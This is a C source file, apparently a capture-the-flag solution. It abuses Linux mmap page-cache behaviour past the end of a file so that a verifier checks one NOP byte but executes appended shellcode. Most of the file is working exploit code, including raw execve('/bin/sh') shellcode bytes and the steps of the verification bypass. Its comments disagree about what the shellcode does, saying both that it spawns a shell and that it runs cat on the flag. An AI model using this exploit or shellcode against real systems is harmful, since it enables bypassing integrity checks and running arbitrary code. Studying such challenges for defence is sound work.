#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <signal.h>
#include <sys/mount.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

// execve("/bin/sh", NULL, NULL) shellcode - spawns a shell
// Shorter and more reliable than cat shellcode
#define FLAG_SHELLCODE "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#define NOP "\x90"
#define NOP_SIZE (1)
#define OUTPUT_PATH "output"

// Exploit strategy:
// This challenge exploits a well-documented mmap bug regarding the file page cache.
// From the mmap(2) man page:
//     "POSIX specifies that the system shall always zero fill any partial page at the end of the
//     object and that system will never write any modification of the object beyond its end. On
//     Linux, when you write data to such partial page after the end of the object, the data
//     stays in the page cache even after the file is closed and unmapped and even though the
//     data is never written to the file itself, subsequent mappings may see the modified content."
//
// Since mmap operates on page-granularity (typically 4096 bytes), we can abuse this behavior.
// The verification process in exec_output() uses fstat() to get the file size and verifies only
// that many bytes. However, the entire page is mapped and executed.
//
// Attack flow:
// 1. Create the "output" file with just a single NOP instruction (0x90)
// 2. Sleep briefly to ensure the write is committed
// 3. Map the file with mmap() and write our flag-reading shellcode past the NOP
// 4. Exit immediately to minimize the window for cache flushing
// 5. The parent process verifies only the NOP byte but executes the entire shellcode
// 6. Our shellcode executes /bin/cat flag.txt to get the flag

int main(void)
{
    // Step 1: Create output file with a single NOP instruction
    int output_fd = -1;
    output_fd = open(OUTPUT_PATH, O_CREAT | O_WRONLY, 0777);
    if (output_fd < 0) {
        perror("open");
        exit(1);
    }
    
    ssize_t written = write(output_fd, NOP, NOP_SIZE);
    if (written != NOP_SIZE) {
        perror("write");
        exit(1);
    }
    
    close(output_fd);
    output_fd = -1;

    // Step 2: Sleep to ensure the write is committed
    sleep(3);

    // Step 3: Map the file and write shellcode beyond the verified region
    output_fd = open(OUTPUT_PATH, O_RDWR);
    if (output_fd < 0) {
        perror("open for mmap");
        exit(1);
    }
    
    uint8_t* mapped_memory = mmap(NULL, NOP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, output_fd, 0);
    if (mapped_memory == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    
    // Write shellcode immediately after the NOP in the page cache
    memcpy(&mapped_memory[NOP_SIZE], FLAG_SHELLCODE, sizeof(FLAG_SHELLCODE));
    
    // Step 4: Exit immediately to preserve the page cache
    exit(0);
}
